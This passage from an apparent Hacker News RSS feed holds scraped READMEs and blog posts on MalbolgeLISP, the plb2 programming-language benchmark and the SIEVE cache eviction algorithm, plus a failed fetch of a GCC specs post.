<a href="https://uutils.github.io/coreutils/book/test_coverage.html" rel="nofollow">in the user manual</a>.</p>
<p dir="auto">See <a href="https://github.com/orgs/uutils/projects/1">https://github.com/orgs/uutils/projects/1</a> for the main meta bugs
(many are missing).</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/uutils/coreutils-tracking/blob/main/gnu-results.png?raw=true"><img src="https://github.com/uutils/coreutils-tracking/raw/main/gnu-results.png?raw=true" alt="Evolution over time"></a></p>
</div><p dir="auto">GNU Coreutils is licensed under the GPL 3.0 or later.</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A lightweight Lisp interpreter in Malbolge (106 pts)]]></title>
            <link>https://github.com/kspalaiologos/malbolge-lisp</link>
            <guid>38850961</guid>
            <pubDate>Wed, 03 Jan 2024 05:08:02 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/kspalaiologos/malbolge-lisp">https://github.com/kspalaiologos/malbolge-lisp</a>, See on <a href="https://news.ycombinator.com/item?id=38850961">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">MalbolgeLISP v1.2</h2>
<p dir="auto">Made by Palaiologos, 2020 - 2021. Core (core.mb) to the public domain, the entire program is governed by the GNU GPLv3 license.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/kspalaiologos/malbolge-lisp/raw/master/session.gif"><img src="https://github.com/kspalaiologos/malbolge-lisp/raw/master/session.gif" alt="Session gif" data-animated-image=""></a></p>
<p dir="auto"><strong><a href="https://github.com/kspalaiologos/malbolge-lisp/raw/master/MalbolgeLisp.pdf">During summer and fall of 2021, I wrote a book about MalbolgeLISP's design and implementation</a></strong></p>
<h2 tabindex="-1" dir="auto">What is MalbolgeLisp?</h2>
<p dir="auto"><strong>MalbolgeLisp</strong> is a LISP interpreter written in Malbolge. It's as of 2020 and 2021, <a href="https://en.wikipedia.org/wiki/Malbolge#Programming_in_Malbolge" rel="nofollow">the most advanced, usable Malbolge program ever created</a>. It supports everything LISPs generally tend to support (like <code>cond</code>, <code>let</code>, <code>lambda</code>, etc...). The v1.2 release greatly improved the performance and reduced the code size, while adding a few features.</p>
<p dir="auto"><strong>MalbolgeLISP</strong> supports tacit programming, partial application, de Bruijn indices, monad lifting, and more.</p>
<p dir="auto">A few fibonacci functions programmed in MalbolgeLISP (and tested on <code>(fibN 6)</code>):</p>
<div dir="auto" data-snippet-clipboard-copy-content="; Naive attempt at 1m 19s
(defun fib1 (n) (
    if [n < 2]
        n
        [(fib1 [n - 1]) + (fib1 [n - 2])]))

; Direct port of accumulator-keeping solution at 1m 6s:
(defun fib2 (n) ((lambda (a w) (
    if [w = 0]
        (#0 a)
        ((bruijn 0) (tie (#1 a) (lift + a)) [w - 1]))) '(0 1) n))

; A more idiomatic solution than the above at 54s:
(defun fib3 (n) ((lambda (x y w) (
    if [w = 0]
        x
        ((bruijn 0) y [x + y] [w - 1]))) 0 1 n))

; Iterative attempt at 43s
(defun fib4 (n) (#0 (
    iterateN n (lambda (x) (
        tie (#1 x) [(#0 x) + (#1 x)])) '(0 1))))"><pre><span><span>;</span> Naive attempt at 1m 19s</span>
(<span>defun</span> <span>fib1</span> (n) (
    <span>if</span> [n &lt; <span>2</span>]
        n
        [(fib1 [n - <span>1</span>]) + (fib1 [n - <span>2</span>])]))

<span><span>;</span> Direct port of accumulator-keeping solution at 1m 6s:</span>
(<span>defun</span> <span>fib2</span> (n) ((<span>lambda</span> (a w) (
    <span>if</span> [w = <span>0</span>]
        (<span>#0</span> a)
        ((bruijn <span>0</span>) (tie (<span>#1</span> a) (lift + a)) [w - <span>1</span>]))) '(<span>0</span> <span>1</span>) n))

<span><span>;</span> A more idiomatic solution than the above at 54s:</span>
(<span>defun</span> <span>fib3</span> (n) ((<span>lambda</span> (x y w) (
    <span>if</span> [w = <span>0</span>]
        x
        ((bruijn <span>0</span>) y [x + y] [w - <span>1</span>]))) <span>0</span> <span>1</span> n))

<span><span>;</span> Iterative attempt at 43s</span>
(<span>defun</span> <span>fib4</span> (n) (<span>#0</span> (
    iterateN n (<span>lambda</span> (x) (
        tie (<span>#1</span> x) [(<span>#0</span> x) + (<span>#1</span> x)])) '(<span>0</span> <span>1</span>))))</pre></div>
<h2 tabindex="-1" dir="auto">What is Malbolge? Why is it difficult?</h2>
<p dir="auto"><strong>Malbolge</strong> is a public domain esoteric programming language. It was specifically designed to be almost impossible to use, via a counter-intuitive 'crazy operation', trinary arithmetic, and self-modifying code. It builds on the difficulty of earlier, challenging esoteric languages like Brainfuck, but takes this aspect to the extreme. Despite this design, it is possible to write useful Malbolge programs (as this project proves).</p>
<p dir="auto">What Malbolge instructions do depends on their position in the source code. After being ran, they are encrypted (so to make a loop, one has to decrypt it after each iteration - sounds hard already?). This is how so-called instruction cycles have been discovered - it has been observed that some instructions on certain locations form looping cycles, which is the basis of Malbolge programming.</p>
<p dir="auto">The most complex programs made in Malbolge, to date, include an adder, a "99 bottles of beer" program, and a "Hello, world!" program (originally generated by a Lisp program utilizing a genetic algorithm).</p>
<p dir="auto">MalbolgeLisp uses a special variant of Malbolge called <strong>Malbolge Unshackled</strong>. It's considerably harder to program for multiple reasons:</p>
<ol dir="auto">
<li>The rotation width is chosen randomly by the interpreter</li>
<li>Malbolge Unshackled lets the width of rotation be variable, which grows with the values in the D register, and since the initial rotation width is unknown, you have to probe it (because otherwise <code>*</code> returns unpredictable results)</li>
<li>Malbolge Unshackled's print instruction requires unicode codepoints</li>
<li>if the rotation width is unknown then you can't load values larger than 3^4-1, except values starting with a <code>1</code> trit</li>
<li>to overcome this you need a loop that probes the rotation width which is probably beyond most people's comprehension</li>
<li>the specification says that the value <code>0t21</code> should be used to print a newline, but this value is <em>theoretically</em> impossible to obtain without having read an end of line or end of file from I/O before.</li>
<li>Malbolge Unshackled is actually usable because it's (as this project proves) Turing complete. The default Malbolge rotation width (10) constraints the addressable memory enough to make something cool with it.</li>
</ol>
<p dir="auto">A few example Malbolge programs:</p>
<p dir="auto">A "Hello World" program:</p>
<div data-snippet-clipboard-copy-content="(=<`#9]~6ZY327Uv4-QsqpMn&amp;+Ij&quot;'E%e{Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV>gY;dts76qKJImZkj"><pre><code>(=&lt;`#9]~6ZY327Uv4-QsqpMn&amp;+Ij"'E%e{Ab~w=_:]Kw%o44Uqp0/Q?xNvL:`H%c#DD2^WV&gt;gY;dts76qKJImZkj
</code></pre></div>
<p dir="auto">A cat program that doesn't terminate on EOF:</p>
<div data-snippet-clipboard-copy-content="(=BA#9&quot;=<;:3y7x54-21q/p-,+*)&quot;!h%B0/.~P<<:(8&amp;66#&quot;!~}|{zyxwvugJk"><pre><code>(=BA#9"=&lt;;:3y7x54-21q/p-,+*)"!h%B0/.~P&lt;&lt;:(8&amp;66#"!~}|{zyxwvugJk
</code></pre></div>
<h2 tabindex="-1" dir="auto">How to use</h2>
<div data-snippet-clipboard-copy-content="$ git clone https://github.com/kspalaiologos/malbolge-lisp
$ cd malbolge-lisp
$ unzip lisp.mb
$ clang -O3 -march=native fast20.c -o fast20
$ cat init_module.mb core.mb > lisp.mb
$ ./fast20 lisp.mb"><pre><code>$ git clone https://github.com/kspalaiologos/malbolge-lisp
$ cd malbolge-lisp
$ unzip lisp.mb
$ clang -O3 -march=native fast20.c -o fast20
$ cat init_module.mb core.mb &gt; lisp.mb
$ ./fast20 lisp.mb
</code></pre></div>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Benchmarking 20 programming languages on N-queens and matrix multiplication (150 pts)]]></title>
            <link>https://github.com/attractivechaos/plb2</link>
            <guid>38850651</guid>
            <pubDate>Wed, 03 Jan 2024 04:13:04 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/attractivechaos/plb2">https://github.com/attractivechaos/plb2</a>, See on <a href="https://news.ycombinator.com/item?id=38850651">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><p dir="auto"><strong>TL;DR</strong>: see the figure below. Note that nqueen and matmul are implemented in
all languages but sudoku and bedcov are only implemented in some.
NB: nqueen and matmul in V have been updated in the <a href="#table">table</a>, but the
figure is not in sync yet. Now V is the fastest on nqueen+matmul.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/attractivechaos/plb2/blob/master/analysis/rst-m1.png"><img src="https://github.com/attractivechaos/plb2/raw/master/analysis/rst-m1.png"></a></p>
<h2 tabindex="-1" dir="auto">Table of Contents</h2>
<ul dir="auto">
<li><a href="#intro">Introduction</a></li>
<li><a href="#result">Results</a>
<ul dir="auto">
<li><a href="#overall">Overall impressions</a></li>
<li><a href="#caveat">Caveats</a>
<ul dir="auto">
<li><a href="#startup">Startup time</a></li>
<li><a href="#cputime">Elapsed time vs CPU time</a></li>
</ul>
</li>
<li><a href="#opt">Subtle optimizations</a>
<ul dir="auto">
<li><a href="#matmul">Optimizing inner loops</a></li>
<li><a href="#memlayout">Controlling memory layout</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#conclusion">Discussions</a></li>
<li><a href="#table">Appendix: Timing on Apple M1 Macbook Pro</a></li>
</ul>
<h2 tabindex="-1" dir="auto"><a name="user-content-intro"></a>Introduction</h2>
<p dir="auto">Programming Language Benchmark v2 (plb2) evaluates the performance of 20
programming languages on four CPU-intensive tasks. It is a follow-up to
<a href="https://github.com/attractivechaos/plb">plb</a> conducted in 2011. In plb2, all implementations use the same
algorithm for each task and their performance bottlenecks do not fall in
library functions. We do not intend to compare different algorithms or the
quality of the standard libraries in these languages. Plb2 is supposed to
demonstrate the performance of a language when you have to implement a new
algorithm in the language, which may happen if you can't find the algorithm in
existing libraries.</p>
<p dir="auto">The four tasks in plb2 all take a few seconds for a fast implementation to
complete. The tasks are:</p>
<ul dir="auto">
<li>
<p dir="auto"><strong>nqueen</strong>: solving a <a href="https://en.wikipedia.org/wiki/Eight_queens_puzzle" rel="nofollow">15-queens problem</a>. The algorithm was inspired
by the second C implementation <a href="https://rosettacode.org/wiki/N-queens_problem#C" rel="nofollow">from Rosetta Code</a>. It involves nested
loops and integer bit operations.</p>
</li>
<li>
<p dir="auto"><strong>matmul</strong>: multiplying two square matrices of 1500x1500 in size. The inner
loop resembles BLAS' <a href="https://en.wikipedia.org/wiki/Basic_Linear_Algebra_Subprograms#Level_1" rel="nofollow">axpy</a> operation.</p>
</li>
<li>
<p dir="auto"><strong>sudoku</strong>: solving 4000 hard <a href="https://en.wikipedia.org/wiki/Sudoku" rel="nofollow">Sudokus</a> (20 puzzles repeated for 200
times) using the <a href="https://attractivechaos.github.io/plb/kudoku.html" rel="nofollow">kudoku algorithm</a>. This algorithm heavily uses
small fixed-sized arrays with a bit complex logic.</p>
</li>
<li>
<p dir="auto"><strong>bedcov</strong>: finding the overlaps between two arrays of 1,000,000 intervals
with <a href="https://academic.oup.com/bioinformatics/article/37/9/1315/5910546" rel="nofollow">implicit interval trees</a>. The algorithm involves frequent
array access in a pattern similar to binary searches.</p>
</li>
</ul>
<p dir="auto">Every language has nqueen and matmul implementations. Some languages do not
have sudoku or bedcov implementations. In addition, I implemented most
algorithms in plb2 and adapted a few contributed matmul and sudoku
implementations in plb. As I am mostly a C programmer, implementations in other
languages may be suboptimal and there are no implementations in functional
languages. <strong>Pull requests are welcomed!</strong></p>
<h2 tabindex="-1" dir="auto"><a name="user-content-result"></a>Results</h2>
<p dir="auto">The figure at the top of the page summarizes the elapsed time of each implementation
measured on an Apple M1 MacBook Pro. <a href="https://github.com/sharkdp/hyperfine">Hyperfine</a> was used for timing
except for a few slow implementations which were timed with the "time" bash
command without repetition. A plus sign "+" indicates an explicit compilation
step. Exact timing can be found in the <a href="#table">table below</a>. The figure was
programmatically generated from the table but may be outdated.</p>
<h3 tabindex="-1" dir="auto"><a name="user-content-overall"></a>Overall impression</h3>
<p dir="auto">Programming language implementations in plb2 can be classified into four groups
depending on how and when compilation is done:</p>
<ol dir="auto">
<li>
<p dir="auto">Purely interpretted with no compilation (Perl and <a href="https://en.wikipedia.org/wiki/CPython" rel="nofollow">CPython</a>, the
official Python implementation). Not surprisingly, these are the slowest
language implementations in this benchmark.</p>
</li>
<li>
<p dir="auto">JIT compiled without a separate compilation step (Dart, all JavaScript
runtimes, Julia, LuaJIT, PHP, PyPy and Ruby3 with <a href="https://github.com/ruby/ruby/blob/master/doc/yjit/yjit.md">YJIT</a>). These
language implementations compile hot code on the fly and then execute. They
have to balance compilation time and running time to achieve the best
overall performance.</p>
<p dir="auto">In this group, although PHP and Ruby3 are faster than Perl and CPython, they
are still an order of magnitude slower than PyPy. The two JavaScript engines
(Bun and Node), Dart and Julia all perform well. They are about twice as
fast as PyPy.</p>
</li>
<li>
<p dir="auto">JIT compiled with a separate compilation step (Java and C#). With separate
compilation, Java and C# can afford to trade compilation time for running
time in theory, but in this benchmark, they are not obviously faster than
those in group 2.</p>
</li>
<li>
<p dir="auto"><a href="https://en.wikipedia.org/wiki/Ahead-of-time_compilation" rel="nofollow">Ahead-of-time compilation</a> (the rest). Optimizing binaries for
specific hardware, these compilers, except Swift, tend to generate the
fastest executables.</p>
</li>
</ol>
<h3 tabindex="-1" dir="auto"><a name="user-content-caveat"></a>Caveats</h3>
<h4 tabindex="-1" dir="auto"><a name="user-content-startup"></a>Startup time</h4>
<p dir="auto">Some JIT-based language runtimes take up to ~0.3 second to compile and warm-up.
We are not separating out this startup time. Nonetheless, because most
benchmarks run for several seconds, including the startup time does not greatly
affect the results.</p>
<h4 tabindex="-1" dir="auto"><a name="user-content-cputime"></a>Elapsed time vs CPU time</h4>
<p dir="auto">Although no implementations use multithreading, language runtimes may be doing
extra work, such as garbage collection, in a separate thread. In this case, the
CPU time (user plus system) may be longer than elapsed wall-clock time. Julia,
in particular, takes noticeably more CPU time than wall-clock time even for the
simplest nqueen benchmark. In plb2, we are measuring the elapsed wall-clock
time because that is the number users often see. The ranking of CPU time may be
slightly different.</p>
<h3 tabindex="-1" dir="auto"><a name="user-content-opt"></a>Subtle optimizations</h3>
<h4 tabindex="-1" dir="auto"><a name="user-content-memlayout"></a>Controlling memory layout</h4>
<p dir="auto">When implementing bedcov in Julia, C and many compiled languages, it is
preferred to have an array of objects in a contiguous memory block such that
adjacent objects are close in memory. This helps cache efficiency. In most
scripting languages, unfortunately, we have to put references to objects in an
array at the cost of cache locality. The issue can be alleviated by cloning
objects to a new array. This doubles the speed of PyPy and Bun.</p>
<h4 tabindex="-1" dir="auto"><a name="user-content-matmul"></a>Optimizing inner loops</h4>
<p dir="auto">The bottleneck of matrix multiplication falls in the following nested loop:</p>
<div dir="auto" data-snippet-clipboard-copy-content="for (int i = 0; i < n; ++i)
    for (int k = 0; k < n; ++k)
        for (int j = 0; j < n; ++j)
            c[i][j] += a[i][k] * b[k][j];"><pre><span>for</span> (<span>int</span> i = <span>0</span>; i &lt; n; ++i)
    <span>for</span> (<span>int</span> k = <span>0</span>; k &lt; n; ++k)
        <span>for</span> (<span>int</span> j = <span>0</span>; j &lt; n; ++j)
            c[i][j] += a[i][k] * b[k][j];</pre></div>
<p dir="auto">It is obvious that <code>c[i]</code>, <code>b[k]</code> and <code>a[i][k]</code> can be moved out of the inner
loop to reduce the frequency of matrix access. The Clang compiler can apply
this optimization. Manual optimization may actually hurt performance.</p>
<p dir="auto">However, <strong>most other languages cannot optimize this nested loop.</strong> If we
manually move <code>a[i][k]</code> to the loop above it, we can often improve their
performance. Some C/C++ programmers say compilers often optimize better than
human, but this might not be the case in other languages.</p>
<h2 tabindex="-1" dir="auto"><a name="user-content-conclusion"></a>Discussions</h2>
<p dir="auto">The most well-known and the longest running language benchmark is the <a href="https://benchmarksgame-team.pages.debian.net/benchmarksgame/index.html" rel="nofollow">Computer
Language Benchmark Games</a>. Plb2 differs in that it includes more recent
languages (e.g. Nim and Crystal), more language runtimes (e.g. PyPy and
LuaJIT) and more tasks (all four tasks are new), and it comes with more uniform
implementations and focuses more on the performance of the language itself
without library functions. <strong>Plb2 complements the Computer Language Benchmark
Games.</strong></p>
<p dir="auto">One important area that plb2 does not evaluate is the performance of memory
allocation and/or garbage collection. This may contribute more to practical
performance than generating machine code. Nonetheless, it is challenging to
design a realistic micro-benchmark to evaluate memory allocation. If the
built-in allocator in a language implementation does not work well, we can
implement customized memory allocator just for the specific task but this, in
my view, would not represent typical use cases.</p>
<p dir="auto">When plb was conducted in 2011, half of the languages in the figure above were
not mature or even did not exist. It is exciting to see many of them have
reached the 1.0 milestone and are gaining popularity among modern programmers.
On the other hand, Python remains one of the two most used scripting languages
despite its poor performance. In my view, this is because PyPy would not be
officially endorsed while other JIT-based languages are not general or good
enough. Will there be a language to displace Python in the next decade? I am
not optimistic.</p>
<h2 tabindex="-1" dir="auto"><a name="user-content-table"></a>Appendix: Timing on Apple M1 Macbook Pro</h2>
<table>
<thead>
<tr>
<th>Label</th>
<th>Language</th>
<th>Runtime</th>
<th>Version</th>
<th>nqueen</th>
<th>matmul</th>
<th>sudoku</th>
<th>bedcov</th>
</tr>
</thead>
<tbody>
<tr>
<td>c:clang+</td>
<td>C</td>
<td>Clang</td>
<td>15.0.0</td>
<td>2.70</td>
<td>0.54</td>
<td>1.54</td>
<td>0.84</td>
</tr>
<tr>
<td>crystal+</td>
<td>Crystal</td>
<td></td>
<td>1.10.0</td>
<td>3.28</td>
<td>2.45</td>
<td></td>
<td>0.87</td>
</tr>
<tr>
<td>c#:.net+</td>
<td>C#</td>
<td>.NET</td>
<td>8.0.100</td>
<td>3.00</td>
<td>4.67</td>
<td>3.01</td>
<td></td>
</tr>
<tr>
<td>d:ldc2+</td>
<td>D</td>
<td>LDC2</td>
<td>2.105.2</td>
<td>2.68</td>
<td>0.57</td>
<td>1.60</td>
<td></td>
</tr>
<tr>
<td>dart</td>
<td>Dart</td>
<td>(JIT)</td>
<td>3.2.4</td>
<td>3.62</td>
<td>4.81</td>
<td>3.24</td>
<td></td>
</tr>
<tr>
<td>go+</td>
<td>Go</td>
<td></td>
<td>1.21.5</td>
<td>2.94</td>
<td>1.63</td>
<td>2.04</td>
<td></td>
</tr>
<tr>
<td>java+</td>
<td>Java</td>
<td>OpenJDK</td>
<td>20.0.1</td>
<td>3.92</td>
<td>1.14</td>
<td>3.20</td>
<td></td>
</tr>
<tr>
<td>js:bun</td>
<td>JavaScript</td>
<td>Bun</td>
<td>1.0.20</td>
<td>3.11</td>
<td>1.75</td>
<td>3.07</td>
<td>2.83</td>
</tr>
<tr>
<td>js:deno</td>
<td>JavaScript</td>
<td>Deno</td>
<td>1.39.1</td>
<td>4.00</td>
<td>3.06</td>
<td>4.04</td>
<td>3.87</td>
</tr>
<tr>
<td>js:k8</td>
<td>JavaScript</td>
<td>k8</td>
<td>1.0</td>
<td>3.79</td>
<td>2.99</td>
<td>3.76</td>
<td>4.02</td>
</tr>
<tr>
<td>js:node</td>
<td>JavaScript</td>
<td>Node</td>
<td>21.5.0</td>
<td>3.73</td>
<td>2.88</td>
<td>3.77</td>
<td>3.83</td>
</tr>
<tr>
<td>julia</td>
<td>Julia</td>
<td></td>
<td>1.10.0</td>
<td>3.75</td>
<td>0.76</td>
<td>2.72</td>
<td>2.47</td>
</tr>
<tr>
<td>luajit</td>
<td>Lua</td>
<td>LuaJIT</td>
<td>2.1</td>
<td>5.31</td>
<td>2.66</td>
<td>4.48</td>
<td>10.59</td>
</tr>
<tr>
<td>mojo+</td>
<td>Mojo</td>
<td></td>
<td>0.6.1</td>
<td>3.24</td>
<td>1.12</td>
<td></td>
<td></td>
</tr>
<tr>
<td>nim+</td>
<td>Nim</td>
<td></td>
<td>2.0.2</td>
<td>3.18</td>
<td>0.69</td>
<td></td>
<td>1.18</td>
</tr>
<tr>
<td>perl</td>
<td>Perl</td>
<td></td>
<td>5.34.1</td>
<td>158.34</td>
<td>158.01</td>
<td>90.78</td>
<td></td>
</tr>
<tr>
<td>php</td>
<td>PHP</td>
<td></td>
<td>8.3</td>
<td>48.15</td>
<td>71.20</td>
<td></td>
<td></td>
</tr>
<tr>
<td>py:pypy</td>
<td>Python</td>
<td>Pypy</td>
<td>7.3.14</td>
<td>6.91</td>
<td>4.95</td>
<td>8.82</td>
<td>6.27</td>
</tr>
<tr>
<td>py:cpy</td>
<td>Python</td>
<td>CPython</td>
<td>3.11.7</td>
<td>159.97</td>
<td>223.66</td>
<td>52.88</td>
<td>42.84</td>
</tr>
<tr>
<td>ruby</td>
<td>Ruby</td>
<td>(YJIT)</td>
<td>3.3.0</td>
<td>88.15</td>
<td>130.51</td>
<td>52.26</td>
<td></td>
</tr>
<tr>
<td>rust+</td>
<td>Rust</td>
<td></td>
<td>1.75.0</td>
<td>2.68</td>
<td>0.56</td>
<td>1.65</td>
<td></td>
</tr>
<tr>
<td>swift+</td>
<td>Swift</td>
<td></td>
<td>5.9.0</td>
<td>2.92</td>
<td>7.46</td>
<td>16.02</td>
<td></td>
</tr>
<tr>
<td>v+</td>
<td>V</td>
<td></td>
<td>0.4.3</td>
<td>2.57</td>
<td>0.56</td>
<td></td>
<td></td>
</tr>
<tr>
<td>zig+</td>
<td>Zig</td>
<td></td>
<td>0.11.0</td>
<td>2.74</td>
<td>0.56</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[GCC Specs: An Introduction (116 pts)]]></title>
            <link>https://wozniak.ca/blog/2024/01/02/1/index.html</link>
            <guid>38850400</guid>
            <pubDate>Wed, 03 Jan 2024 03:35:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wozniak.ca/blog/2024/01/02/1/index.html">https://wozniak.ca/blog/2024/01/02/1/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=38850400">Hacker News</a></p>
Couldn't get https://wozniak.ca/blog/2024/01/02/1/index.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Sieve is simpler than LRU (250 pts)]]></title>
            <link>https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/</link>
            <guid>38850202</guid>
            <pubDate>Wed, 03 Jan 2024 03:07:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/">https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/</a>, See on <a href="https://news.ycombinator.com/item?id=38850202">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-md-component="container"> <main data-md-component="main"> <div data-md-component="content">  <article>  <p>Caching is a method of storing temporary data for quick access to keep the online world running smoothly. But with limited space, comes a critical decision: what to keep and what to discard. This is where <strong>eviction algorithms</strong> come into play. Our team recently designed a new cache eviction algorithm called <strong>SIEVE</strong>: it is both very effective and simple with just one FIFO queue.</p> <!-- more --> <h2 id="the-importance-of-simplicity">The Importance of Simplicity<a href="#the-importance-of-simplicity" title="Permanent link">¶</a></h2> <p>In the world of cache eviction algorithms, there's something to be said for keeping it simple. Complex algorithms, for all their sophistication, can bring their own set of headaches. They can be tricky to debug, sometimes unexpectedly drag down efficiency, and even put a damper on throughput and scalability because of their higher computational needs. </p> <p>On the flip side, simpler eviction methods, though maybe not as flashy in managing cache, have a knack for improving system throughput and scalability. Just look at examples like <a href="https://www.usenix.org/conference/nsdi13/technical-sessions/presentation/fan">MemC3</a> and <a href="https://www.usenix.org/conference/nsdi21/presentation/yang-juncheng">Segcache</a>. They rely on straightforward approaches like FIFO and manage to significantly boost system performance. It turns out, sometimes, the best move is to keep things uncomplicated!</p> <h2 id="meet-sieve-the-harmony-of-simplicity-and-efficiency">Meet SIEVE: The Harmony of Simplicity and Efficiency<a href="#meet-sieve-the-harmony-of-simplicity-and-efficiency" title="Permanent link">¶</a></h2> <p>SIEVE is an algorithm that decides what to keep in the cache and what to discard. But unlike its predecessors, it does this with a flair for simplicity and efficiency.</p> <h3 id="a-technical-walkthrough-of-sieve">A Technical Walkthrough of SIEVE<a href="#a-technical-walkthrough-of-sieve" title="Permanent link">¶</a></h3> <p>SIEVE is built on a FIFO queue, supplemented by a "hand" pointer that navigates through the cache. Each object in the queue has a bit indicating whether it's been visited. On a cache hit, SIEVE marks the object as visited. On a cache miss, SIEVE checks the object pointed to by the hand. If the object has been visited, its visited bit is reset, and the hand moves to the next position, keeping the retained object in its original position in the queue. This continues until an unvisited object is found and evicted. After eviction, the hand moves to the next position.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve_diagram_animation.gif" alt="sieve-diagram-gif"> </p> <figcaption>An iilustration of SIEVE</figcaption> </figure> <p>At first glance, SIEVE is similar to CLOCK/Second Chance/FIFO-Reinsertion - <em>Note that they are different implementations of the same eviction algorithm</em>. Each algorithm maintains a single queue in which each object is associated with a visited bit to track its access status. Visited objects are retained (also called "survived") during an eviction. Notably, new objects are inserted at the head of the queue in both SIEVE and FIFO-Reinsertion. However, the hand in SIEVE moves from the tail to the head over time, whereas the hand in FIFO-Reinsertion stays at the tail. <strong>The key difference is where a retained object is kept.</strong> SIEVE keeps it in the old position, while FIFO-Reinsertion inserts it at the head, together with newly inserted objects.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve-diagram.png" alt="figure-sieve-efficiency-small"> </p> <figcaption>SIEVE vs. CLOCK</figcaption> </figure> <!-- ```bash title="SIEVE pseudocode"
Input: The request x, doubly-linked queue T, cache size C, hand p
1: if x is in T then                            # Cache Hit
2:     x.visited <- true
3: else                                         # Cache Miss
4:     if |T| = C then                          # Cache Full
5:         obj <- p
6:         if obj is NULL then
7:             obj <- tail of T
8:         while obj.visited = true do
9:             obj.visited <- false
10:            obj <- obj.prev
11:            if obj is NULL then
12:                obj <- tail of T
13:        p <- obj.prev
14:        Discard obj in T                     # Eviction
15:    Insert x in the head of T
16:    x.visited <- false                       # Insertion
``` --> <p>For anyone interested, see the <a href="#sieve-cache-code">sieve cache implementation code</a> at the end of this blog post for a detailed example.</p> <h3 id="sieves-real-world-impact-a-performance-breakdown">SIEVE's Real-World Impact: A Performance Breakdown<a href="#sieves-real-world-impact-a-performance-breakdown" title="Permanent link">¶</a></h3> <p>SIEVE's practicality shines in its real-world application. </p> <h4 id="efficiency">Efficiency<a href="#efficiency" title="Permanent link">¶</a></h4> <p>Our evaluation, involving over 1559 traces from diverse datasets that together contain 247,017 million requests to 14,852 million objects, show that SIEVE outperforms all state-of-the-art eviction algorithms on more than 45% of the traces.</p> <p>The following figure shows the miss ratio reduction (from FIFO) of different algorithms across traces. The whiskers on the boxplots are defined using p10 and p90, allowing us to disregard extreme data and concentrate on the typical cases. SIEVE demonstrates the most significant reductions across nearly all percentiles. For example, SIEVE reduces FIFO’s miss ratio by more than 42% on 10% of the traces (top whisker) with a mean of 21% on the one of the largest CDN company dataset. As a comparison, all other algorithms have smaller reductions on this dataset. Compared to advanced algorithms, e.g., ARC, SIEVE reduces ARC miss ratio by up to 63.2% with a mean of 1.5%.</p> <!-- While SIEVE excels with large caches, it faces competition at smaller sizes from algorithms like TwoQ and LHD. This is due to their ability to quickly discard low-value objects, a challenge for SIEVE when cache space is limited. However, at larger cache sizes, where real-world applications often operate, SIEVE consistently outperforms its peers. --> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/efficiency-large.png" alt="figure-sieve-efficiency-large"></p> <!-- <figcaption>Image caption</figcaption> --> </figure> <h4 id="simplicity">Simplicity<a href="#simplicity" title="Permanent link">¶</a></h4> <p>SIEVE is very simple. We delved into the most popular cache libraries and systems across five diverse programming languages: C++, Go, JavaScript, Python, and Rust. </p> <p>Despite the varied ways LRU is implemented across these libraries - some opt for doubly-linked lists, others for arrays - integrating SIEVE turned out to be a breeze. Whether it's the structural differences or the coding style, SIEVE slotted in smoothly. As illustrated in the Table, the required code changes to replace LRU with SIEVE were minimal. In all cases, it took no more than 21 lines of code modifications (tests not included).</p> <figure> <table> <thead> <tr> <th>Cache library</th> <th>Language</th> <th>Lines</th> <th>Hour of Work</th> </tr> </thead> <tbody> <tr> <td><a href="https://github.com/cacheMon/groupcache">groupcache</a></td> <td>Golang</td> <td>21</td> <td>&lt;1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/mnemonist">mnemonist</a></td> <td>Javascript</td> <td>12</td> <td>1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/lru-rs">lru-rs</a></td> <td>Rust</td> <td>16</td> <td>1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/lru-dict">lru-dict</a></td> <td>Python + C</td> <td>21</td> <td>&lt;1</td> </tr> </tbody> </table> </figure> <h4 id="throughput">Throughput<a href="#throughput" title="Permanent link">¶</a></h4> <p>Besides efficiency, throughput is the other important metric for caching systems. Although we have implemented SIEVE in five different libraries, we focus on Cachelib’s results.</p> <p>Compared to these LRU-based algorithms, SIEVE does not require “promotion” at each cache hit. Therefore, it is faster and more scalable. At a single thread, SIEVE is 16% (17%) faster than the optimized LRU (TwoQ) and on the tested traces. At 16 threads, SIEVE shows more than 2× higher throughput than the optimized LRU and TwoQ.</p> <!-- In Cachelib, LRU and TwoQ have been tweaked for better scalability. With smart moves like limiting promotion frequency and introducing lock combining, we've seen a 6× increase in throughput at 16 threads, a significant jump from just one thread on the Twitter trace. On the other hand, the classic, unoptimized LRU hits its limit at 4 threads.

